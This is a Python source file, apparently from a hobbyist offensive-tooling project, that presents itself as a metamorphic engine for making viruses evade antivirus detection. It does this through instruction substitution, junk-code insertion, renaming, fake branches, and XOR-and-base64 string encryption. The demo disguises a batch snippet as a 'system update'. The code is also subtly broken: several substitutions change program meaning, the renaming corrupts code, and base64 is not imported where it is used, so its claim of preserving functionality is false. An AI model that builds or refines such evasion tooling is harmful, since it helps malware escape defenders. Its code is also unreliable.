#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Metamorphic Engine for Advanced Virus Evasion
by VulnerabilityVigilante

This module implements metamorphic techniques that completely change
the virus structure while maintaining functionality, making it extremely
difficult for antivirus engines to detect.

Features:
- Complete code structure transformation
- Instruction substitution and reordering
- Dead code insertion and removal
- Control flow graph modification
- Register and variable renaming
- Function inlining and outlining
"""

import os
import sys
import random
import string
import ast
import re
from typing import Dict, List, Optional, Tuple, Any
import logging

class MetamorphicEngine:
    """Advanced metamorphic code transformation engine"""
    
    def __init__(self):
        self.transformation_count = 0
        self.instruction_map = {}
        self.register_map = {}
        self.variable_map = {}
        
        # Instruction substitution patterns
        self.instruction_substitutions = {
            # Arithmetic operations
            'add': ['inc', 'lea', 'adc'],
            'sub': ['dec', 'sbb', 'neg'],
            'mul': ['imul', 'lea'],
            'div': ['idiv', 'sar', 'shr'],
            
            # Logical operations
            'and': ['test', 'cmp'],
            'or': ['bts', 'bsr'],
            'xor': ['not', 'neg'],
            
            # Control flow
            'jmp': ['call', 'ret'],
            'call': ['jmp', 'push'],
            'ret': ['pop', 'jmp'],
            
            # Memory operations
            'mov': ['lea', 'push', 'pop'],
            'push': ['mov', 'lea'],
            'pop': ['mov', 'lea']
        }
        
        # Dead code patterns
        self.dead_code_patterns = [
            'nop',
            'mov eax, eax',
            'push eax; pop eax',
            'add eax, 0',
            'sub eax, 0',
            'xor eax, 0',
            'and eax, -1',
            'or eax, 0',
            'test eax, eax',
            'cmp eax, eax'
        ]
        
        # Setup logging
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)
    
    def transform_instructions(self, code: str) -> str:
        """Transform individual instructions"""
        transformed_code = code
        
        # Apply instruction substitutions
        for original, alternatives in self.instruction_substitutions.items():
            if original in transformed_code.lower():
                replacement = random.choice(alternatives)
                transformed_code = re.sub(
                    rf'\b{original}\b', 
                    replacement, 
                    transformed_code, 
                    flags=re.IGNORECASE
                )
        
        return transformed_code
    
    def insert_dead_code(self, code: str, count: int = 5) -> str:
        """Insert dead code to confuse analysis"""
        lines = code.split('\n')
        dead_code_lines = []
        
        for _ in range(count):
            pattern = random.choice(self.dead_code_patterns)
            dead_code_lines.append(pattern)
        
        # Insert dead code at random positions
        for dead_line in dead_code_lines:
            if lines:
                insert_pos = random.randint(0, len(lines))
                lines.insert(insert_pos, dead_line)
        
        return '\n'.join(lines)
    
    def reorder_instructions(self, code: str) -> str:
        """Reorder independent instructions"""
        lines = code.split('\n')
        
        # Group independent instructions
        independent_groups = []
        current_group = []
        
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                if current_group:
                    independent_groups.append(current_group)
                    current_group = []
                independent_groups.append([line])
            else:
                current_group.append(line)
        
        if current_group:
            independent_groups.append(current_group)
        
        # Reorder groups randomly
        reordered_lines = []
        for group in independent_groups:
            if len(group) > 1 and not any(line.startswith('#') for line in group):
                random.shuffle(group)
            reordered_lines.extend(group)
        
        return '\n'.join(reordered_lines)
    
    def rename_variables(self, code: str) -> str:
        """Rename variables and registers"""
        transformed_code = code
        
        # Find all variables and registers
        variables = re.findall(r'\b[a-zA-Z_][a-zA-Z0-9_]*\b', code)
        registers = re.findall(r'\b(eax|ebx|ecx|edx|esi|edi|esp|ebp|rax|rbx|rcx|rdx|rsi|rdi|rsp|rbp)\b', code, re.IGNORECASE)
        
        # Create renaming maps
        for var in set(variables):
            if var not in ['echo', 'if', 'goto', 'for', 'in', 'do', 'set', 'call', 'timeout']:
                if var not in self.variable_map:
                    new_name = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(6, 12)))
                    self.variable_map[var] = new_name
                transformed_code = transformed_code.replace(var, self.variable_map[var])
        
        for reg in set(registers):
            if reg not in self.register_map:
                # Map to equivalent register
                register_equivalents = {
                    'eax': ['ebx', 'ecx', 'edx'],
                    'ebx': ['eax', 'ecx', 'edx'],
                    'ecx': ['eax', 'ebx', 'edx'],
                    'edx': ['eax', 'ebx', 'ecx'],
                    'rax': ['rbx', 'rcx', 'rdx'],
                    'rbx': ['rax', 'rcx', 'rdx'],
                    'rcx': ['rax', 'rbx', 'rdx'],
                    'rdx': ['rax', 'rbx', 'rcx']
                }
                equivalents = register_equivalents.get(reg.lower(), [reg])
                new_reg = random.choice(equivalents)
                self.register_map[reg] = new_reg
            transformed_code = transformed_code.replace(reg, self.register_map[reg])
        
        return transformed_code
    
    def modify_control_flow(self, code: str) -> str:
        """Modify control flow structure"""
        lines = code.split('\n')
        modified_lines = []
        
        for i, line in enumerate(lines):
            line = line.strip()
            
            # Add fake conditional branches
            if random.random() < 0.3 and not line.startswith('#'):
                fake_condition = f"if {random.randint(1, 100)} == {random.randint(1, 100)}"
                modified_lines.append(f"{fake_condition} goto :fake_{i}")
                modified_lines.append(f":fake_{i}")
            
            modified_lines.append(line)
            
            # Add fake labels
            if random.random() < 0.2:
                fake_label = f":fake_label_{random.randint(1000, 9999)}"
                modified_lines.append(fake_label)
        
        return '\n'.join(modified_lines)
    
    def inline_functions(self, code: str) -> str:
        """Inline small functions to change structure"""
        # Find function definitions
        function_pattern = r'(\w+)\s*\(\)\s*\{([^}]+)\}'
        functions = re.findall(function_pattern, code, re.DOTALL)
        
        transformed_code = code
        
        for func_name, func_body in functions:
            # Find function calls
            call_pattern = rf'\b{func_name}\s*\(\)'
            calls = re.findall(call_pattern, transformed_code)
            
            if len(calls) <= 3:  # Only inline if called few times
                # Replace calls with function body
                transformed_code = re.sub(call_pattern, func_body.strip(), transformed_code)
                # Remove function definition
                func_def_pattern = rf'{func_name}\s*\(\)\s*\{{[^}}]+\}}'
                transformed_code = re.sub(func_def_pattern, '', transformed_code, flags=re.DOTALL)
        
        return transformed_code
    
    def outline_code(self, code: str) -> str:
        """Extract repeated code into functions"""
        lines = code.split('\n')
        
        # Find repeated patterns
        pattern_count = {}
        for i in range(len(lines) - 2):
            pattern = '\n'.join(lines[i:i+3])
            if pattern not in pattern_count:
                pattern_count[pattern] = []
            pattern_count[pattern].append(i)
        
        # Extract repeated patterns into functions
        transformed_lines = lines.copy()
        function_counter = 0
        
        for pattern, positions in pattern_count.items():
            if len(positions) >= 2:  # Pattern appears at least twice
                func_name = f"func_{function_counter}"
                function_counter += 1
                
                # Create function
                function_def = f"{func_name}() {{\n{pattern}\n}}"
                
                # Replace first occurrence with function call
                first_pos = positions[0]
                transformed_lines[first_pos:first_pos+3] = [f"{func_name}()"]
                
                # Replace other occurrences with function calls
                offset = 0
                for pos in positions[1:]:
                    adjusted_pos = pos - offset
                    transformed_lines[adjusted_pos:adjusted_pos+3] = [f"{func_name}()"]
                    offset += 2  # We removed 3 lines and added 1
                
                # Insert function definition at the beginning
                transformed_lines.insert(0, function_def)
        
        return '\n'.join(transformed_lines)
    
    def apply_metamorphic_transformation(self, code: str) -> str:
        """Apply complete metamorphic transformation"""
        self.transformation_count += 1
        
        self.logger.info(f"Applying metamorphic transformation #{self.transformation_count}")
        
        # Apply all transformations
        transformed_code = code
        
        # 1. Transform instructions
        transformed_code = self.transform_instructions(transformed_code)
        
        # 2. Insert dead code
        dead_code_count = random.randint(3, 8)
        transformed_code = self.insert_dead_code(transformed_code, dead_code_count)
        
        # 3. Reorder instructions
        transformed_code = self.reorder_instructions(transformed_code)
        
        # 4. Rename variables and registers
        transformed_code = self.rename_variables(transformed_code)
        
        # 5. Modify control flow
        transformed_code = self.modify_control_flow(transformed_code)
        
        # 6. Inline/outline functions
        if random.random() < 0.5:
            transformed_code = self.inline_functions(transformed_code)
        else:
            transformed_code = self.outline_code(transformed_code)
        
        return transformed_code
    
    def generate_variant(self, code: str, variant_id: int) -> str:
        """Generate a specific variant of the code"""
        # Reset transformation state for consistent variant generation
        self.transformation_count = 0
        self.instruction_map = {}
        self.register_map = {}
        self.variable_map = {}
        
        # Use variant_id as seed for reproducible variants
        random.seed(variant_id)
        
        # Apply metamorphic transformation
        variant_code = self.apply_metamorphic_transformation(code)
        
        # Add variant-specific modifications
        variant_header = f"# Metamorphic Variant #{variant_id}\n"
        variant_header += f"# Generated: {random.randint(1000, 9999)}\n"
        variant_header += f"# Checksum: {hash(code) % 10000}\n\n"
        
        return variant_header + variant_code
    
    def create_family(self, base_code: str, family_size: int = 5) -> List[str]:
        """Create a family of metamorphic variants"""
        family = []
        
        for i in range(family_size):
            variant = self.generate_variant(base_code, i + 1)
            family.append(variant)
        
        return family

class AdvancedMetamorphicEngine(MetamorphicEngine):
    """Enhanced metamorphic engine with additional techniques"""
    
    def __init__(self):
        super().__init__()
        
        # Advanced transformation techniques
        self.encryption_keys = {}
        self.compression_levels = [1, 6, 9]
        
    def encrypt_strings(self, code: str) -> str:
        """Encrypt string literals"""
        import base64
        
        # Find string literals
        string_pattern = r'"([^"]+)"'
        strings = re.findall(string_pattern, code)
        
        transformed_code = code
        
        for string_literal in strings:
            if len(string_literal) > 3:  # Only encrypt longer strings
                # Generate encryption key
                key = random.randint(1, 255)
                self.encryption_keys[string_literal] = key
                
                # Encrypt string
                encrypted = ''.join(chr(ord(c) ^ key) for c in string_literal)
                encoded = base64.b64encode(encrypted.encode()).decode()
                
                # Replace in code
                original_quoted = f'"{string_literal}"'
                decryption_code = f'decrypt_string("{encoded}", {key})'
                transformed_code = transformed_code.replace(original_quoted, decryption_code)
        
        return transformed_code
    
    def compress_code(self, code: str) -> str:
        """Compress code sections"""
        import zlib
        
        # Split code into sections
        sections = code.split('\n\n')
        compressed_sections = []
        
        for section in sections:
            if len(section) > 50:  # Only compress larger sections
                compressed = zlib.compress(section.encode())
                encoded = base64.b64encode(compressed).decode()
                compressed_sections.append(f'decompress_section("{encoded}")')
            else:
                compressed_sections.append(section)
        
        return '\n\n'.join(compressed_sections)
    
    def apply_advanced_transformation(self, code: str) -> str:
        """Apply advanced metamorphic transformation"""
        transformed_code = code
        
        # Apply base transformations
        transformed_code = self.apply_metamorphic_transformation(transformed_code)
        
        # Apply advanced transformations
        transformed_code = self.encrypt_strings(transformed_code)
        transformed_code = self.compress_code(transformed_code)
        
        return transformed_code

def main():
    """Test the metamorphic engine"""
    engine = AdvancedMetamorphicEngine()
    
    # Test code
    test_code = """
echo "Starting system update..."
timeout /t 5 /nobreak >nul
echo "Update complete"
"""
    
    print("Original code:")
    print(test_code)
    print("\n" + "="*50)
    
    # Generate variants
    variants = engine.create_family(test_code, 3)
    
    for i, variant in enumerate(variants):
        print(f"\nVariant {i+1}:")
        print(variant)
        print("\n" + "-"*30)

if __name__ == "__main__":
    main()